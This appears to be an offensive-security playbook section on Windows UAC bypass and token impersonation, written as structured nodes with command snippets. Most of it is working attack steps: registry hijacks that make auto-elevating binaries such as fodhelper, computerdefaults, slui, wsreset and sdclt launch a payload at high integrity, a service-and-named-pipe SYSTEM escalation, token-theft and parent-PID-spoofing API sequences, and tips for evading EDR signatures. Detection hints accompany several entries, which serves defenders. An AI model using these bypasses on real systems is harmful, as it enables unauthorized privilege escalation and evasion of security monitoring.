phase.title: UAC Bypass & Token Impersonation
phase.summary: Bypass User Account Control to elevate from Medium IL to High IL, plus low-level token impersonation primitives.

nodes.title: fodhelper.exe registry hijack
nodes.summary: fodhelper auto-elevates and reads a HKCU registry key — point it at your payload.

snippets.title: Stage HKCU key and trigger
snippets.code:
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Temp\payload.exe" /f
fodhelper.exe

nodes.description_md:
fodhelper.exe (`C:\Windows\System32\fodhelper.exe`) is an auto-elevating binary that manages optional Windows features. It reads handler configuration from the `ms-settings` COM extension class, which is resolved through the registry — checking `HKCU` before `HKLM`.

**Why it works**: fodhelper's manifest includes `requireAdministrator` + `autoElevate`, so Windows UAC silently elevates it. When it launches, it opens an `ms-settings:` URL, consulting `HKCU\Software\Classes\ms-settings\Shell\Open\command`. Since HKCU is writable by the current user, pointing this command at your payload spawns a High-integrity child process.

**Steps**:
1. `reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f` (empty DelegateExecute forces shell to use the open command)
2. `reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Temp\payload.exe" /f`
3. `fodhelper.exe` — spawns payload at High integrity

**Cleanup**: `reg delete "HKCU\Software\Classes\ms-settings" /f`

**Applicability**: Works on Windows 10 and Server 2016+. Does not work if UAC is set to 'Always notify' (max level) or if the user isn't in the Administrators group.
nodes.detection_hints: Writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command` (Sysmon EID 13); fodhelper.exe spawning unexpected child processes; process integrity level jump from Medium to High.

nodes.title: eventvwr.exe HKCU hijack
nodes.summary: Classic eventvwr bypass (older builds) — patched on modern Win10 but works on Server 2016 / Win10 1607.
nodes.description_md:
eventvwr.exe (Event Viewer) is auto-elevating and queries the `mscfile` COM class handler when launched. On Windows 7, 8, and Server 2008-2012, and unpatched Windows 10 1607, it reads the handler from `HKCU\Software\Classes\mscfile\shell\open\command` before HKLM, allowing a per-user handler override.

**Classic exploitation**:
1. `reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Temp\payload.exe" /f`
2. `eventvwr.exe` — spawns payload at High integrity

**Scope**: Patched in Windows 10 FCU (1703) by making eventvwr.exe no longer auto-elevate via this path. Still functional on:
- Windows 7 / Windows 8.1
- Windows Server 2008 / 2012 / 2012 R2
- Windows Server 2016
- Unpatched Win10 builds prior to 1703

**Detection circumvention**: Because it's HKCU, no admin rights are needed to set up the trigger.
nodes.detection_hints: HKCU mscfile handler registry writes; eventvwr.exe spawning unexpected children; process integrity escalation from Medium to High.

nodes.title: sdclt.exe App-Paths bypass
nodes.summary: Use App Paths under HKCU to redirect sdclt's child invocation.
nodes.description_md:
sdclt.exe (Backup and Restore) is auto-elevating and launches a helper process that resolves execution path through the `exefile` COM handler or a specific App Paths subkey under HKCU. The `/KickOffElev` switch forces an elevation event that reads from HKCU registry paths the attacker can control.

**Technique variations**:

**Variant 1 — exefile IsolatedCommand**:
```cmd
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v IsolatedCommand /d "C:\Temp\payload.exe" /f
sdclt.exe /KickOffElev
```

**Variant 2 — Folder handler**:
```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "C:\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /f
sdclt.exe
```

**Applicability**: Reliable on Windows 10 1703+ (where eventvwr was patched). Check UACME for the current working variant per build.
nodes.detection_hints: Writes to `HKCU\Software\Classes\exefile\shell\runas\command` or `Folder\shell\open\command`; sdclt.exe spawning non-backup children; UAC prompt absence for admin-level process.

nodes.title: computerdefaults.exe bypass
nodes.summary: Same ms-settings hijack pattern as fodhelper, alternate trigger binary.

snippets.title: Trigger via computerdefaults
snippets.code:
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
computerdefaults.exe

nodes.description_md:
computerdefaults.exe ("Default Apps" settings UI) is auto-elevating and, like fodhelper, reads its launch configuration from the `ms-settings` COM extension class. Because it uses the same HKCU registry path as fodhelper, the exploitation technique is identical — different trigger binary.

**Why use computerdefaults over fodhelper**:
- Some EDR/SIEM products have specific signatures for fodhelper process chains
- computerdefaults.exe provides an alternative trigger when fodhelper is monitored
- Both present the same HKCU registry hijack opportunity

**Steps** (identical to fodhelper):
1. Write empty `DelegateExecute` to `HKCU\Software\Classes\ms-settings\Shell\Open\command`
2. Write your payload path as the default value of the same key
3. Execute `computerdefaults.exe`

**Cleanup**: Delete `HKCU\Software\Classes\ms-settings\` key after exploitation.
nodes.detection_hints: Same detection signals as uac-fodhelper; computerdefaults.exe spawning unexpected children; HKCU ms-settings handler modification.

nodes.title: ICMLuaUtil COM elevation
nodes.summary: COM-object based bypass using the ICMLuaUtil interface; commonly seen in red-team tooling.

snippets.title: Concept
snippets.code: Spawn IElevatedFactoryServer via ICMLuaUtil to launch payload from an auto-elevating IFileOperation context.

nodes.description_md:
ICMLuaUtil is an internal COM interface (`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`) used by Windows setup components to run elevated operations. It exposes a `ShellExec` method that executes a program at High integrity when invoked through the COM elevation moniker.

**How it works**: The COM server implementing ICMLuaUtil is registered to auto-elevate via UAC COM elevation. By instantiating it through `CoCreateInstance` with the `CLSCTX_LOCAL_SERVER` flag and the elevation moniker, a medium-integrity process can invoke methods that run code at high integrity.

**Implementation**: Implemented in custom C++ or .NET (e.g., via UACMe technique #41). No registry modifications needed — purely COM-based.

**UACME implementation**: Listed as a method in the UACME framework (github.com/hfiref0x/UACME). The exact CLSID may change between Windows builds — consult the UACME method index for the current valid entry.

**Limitation**: Requires the user to be in the local Administrators group and UAC to be enabled but not at max level.
nodes.detection_hints: COM activation of IElevatedFactoryServer or ICMLuaUtil CLSIDs from non-elevated processes; unusual COM server instantiation chains involving auto-elevating COM objects.

nodes.title: Token theft via OpenProcessToken / DuplicateTokenEx
nodes.summary: With SeDebug, duplicate a high-IL process token and start a new process with it.
nodes.description_md:
With SeDebugPrivilege, an attacker can open any running process (including those at High or System integrity), duplicate their primary or impersonation token, and use it to spawn a new process at the target's integrity level.

**Step-by-step**:
1. `OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, pid_of_high_il_proc)`
2. `OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_IMPERSONATE)`
3. `DuplicateTokenEx` → `TokenPrimary` (for `CreateProcessWithTokenW`)
4. `CreateProcessWithTokenW` or `CreateProcessAsUserW` with the duplicated token

**Targets**: Processes running at High integrity (UAC-elevated) or SYSTEM (winlogon, services). This is also the mechanism behind `Invoke-TokenManipulation` and Meterpreter's `getsystem`.

**Token impersonation vs. primary token**: Impersonation tokens (via `ImpersonateLoggedOnUser`) work for the current thread only. Creating a new process requires a primary token (`DuplicateTokenEx` with `TokenPrimary`).
nodes.detection_hints: SeDebugPrivilege-enabled process calling OpenProcess on high-integrity processes; DuplicateTokenEx + CreateProcessWithTokenW API sequence (Sysmon EID 10 for process access); process integrity jumps.

nodes.title: Named-pipe impersonation primitive
nodes.summary: Create a server pipe, coerce a privileged client to connect, then ImpersonateNamedPipeClient.
nodes.description_md: Underpins the entire Potato family. Worth understanding the primitive even when using a Potato wrapper.

snippets.title: Primitive (pseudo)
snippets.code:
1. CreateNamedPipeW(\\.\pipe\xyz, PIPE_ACCESS_DUPLEX, ...)
2. Coerce a privileged client to connect (Spooler / EFSR / DCOM)
3. ConnectNamedPipe / ReadFile
4. ImpersonateNamedPipeClient(hPipe)
5. OpenThreadToken + CreateProcessWithTokenW

nodes.title: slui.exe registry hijack
nodes.summary: Auto-elevated slui.exe launches a hijacked verb handler at High integrity.
nodes.description_md: `slui.exe` is auto-elevating. Hijack the `exefile`/`.exe` open command under `HKCU` so launching slui spawns your payload elevated. A classic fileless UAC bypass requiring no admin to set up.
nodes.detection_hints: HKCU\Software\Classes\<class>\shell\open\command writes followed by slui.exe spawning a child.

snippets.title: Set hijack & trigger
snippets.code:
reg add "HKCU\Software\Classes\exefile\shell\open\command" /d "C:\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /f
slui.exe

nodes.title: wsreset.exe bypass
nodes.summary: Auto-elevated Store reset tool runs a hijacked app-path command elevated.
nodes.description_md: `WSReset.exe` auto-elevates and resolves a command from `HKCU\Software\Classes\AppX...\Shell\open\command`. Plant your command there, run wsreset, get a High-integrity process.

snippets.title: Hijack & trigger
snippets.code:
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /d "C:\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /v DelegateExecute /f
WSReset.exe

nodes.title: SilentCleanup scheduled task
nodes.summary: Abuse the SilentCleanup task that runs Highest while expanding %windir%.
nodes.description_md: The built-in `SilentCleanup` task runs at highest privileges and executes `%windir%\system32\cleanmgr.exe`. As a normal user you can set `windir` in your environment to a command, then trigger the task — it runs your command elevated.

nodes.title: CompMgmtLauncher.exe bypass
nodes.summary: Legacy auto-elevated launcher resolves a hijacked mscfile handler.
nodes.description_md: On older builds, `CompMgmtLauncher.exe` auto-elevates and opens an MMC via the `mscfile` class handler. Hijack `HKCU\Software\Classes\mscfile\shell\open\command` to run elevated. Same pattern as the eventvwr bypass.

nodes.title: dccw.exe bypass
nodes.summary: Display Color Calibration tool auto-elevates and is abusable via DLL/handler.
nodes.description_md: `dccw.exe` auto-elevates and can be chained with a control-panel/handler hijack to launch an elevated payload. Useful where the more common handlers are monitored.

snippets.title: Approach
snippets.code: dccw.exe auto-elevates; pair with an IFileOperation/handler hijack to drop+run a High-integrity payload. See UACME method index for the current working variant per build.

nodes.title: fodhelper CurVer variant
nodes.summary: A stealthier fodhelper bypass using the ms-settings CurVer redirection.
nodes.description_md: Instead of writing the `ms-settings\shell\open\command` directly, redirect the class via `CurVer` to a custom ProgID you control. Evades signatures that only watch the canonical fodhelper key.

nodes.title: Environment-variable expansion abuse
nodes.summary: Auto-elevated tasks/binaries that expand user-controlled env vars run your code.
nodes.description_md: Several auto-elevated tasks build their command line from environment variables (e.g. `windir`, `SystemRoot`). Where the variable is read from `HKCU\Environment` first, a normal user can inject a command. The SilentCleanup task is the canonical example.

nodes.title: Parent PID spoofing
nodes.summary: Spawn a child under an elevated parent to inherit a High-integrity token.
nodes.description_md: With a handle to an elevated process you can set it as the explicit parent (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) of a new process, inheriting its token. Combined with token duplication this yields elevation and breaks naive parent-child detections.
nodes.detection_hints: Mismatch between logged parent PID and the actual spawning process; unusual CreateProcess attribute lists.

snippets.title: Concept
snippets.code:
1. OpenProcess(elevated_pid) with PROCESS_CREATE_PROCESS
2. InitializeProcThreadAttributeList + UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
3. CreateProcess(payload.exe, EXTENDED_STARTUPINFO_PRESENT)

nodes.title: GetSystem via service + named pipe
nodes.summary: Create a service that connects to your pipe; impersonate the SYSTEM client.
nodes.description_md: The Metasploit `getsystem` technique: with admin (High integrity) create a temporary service whose command writes to a named pipe you host; when the SYSTEM service connects, impersonate the pipe client to obtain a SYSTEM token.

snippets.title: Service → pipe
snippets.code: sc create svcpwn binPath= "cmd /c echo x > \\.\pipe\svcpwn" & sc start svcpwn

nodes.title: ms-settings DelegateExecute bypass
nodes.summary: Empty DelegateExecute forces the shell to use your open command, elevated.
nodes.description_md: The fodhelper/computerdefaults family resolves `ms-settings`. Adding an empty `DelegateExecute` value next to your `command` makes the shell honor your command rather than the COM delegate — the reliable form of the bypass on modern builds.

snippets.title: Full key set
snippets.code:
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "C:\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
computerdefaults.exe
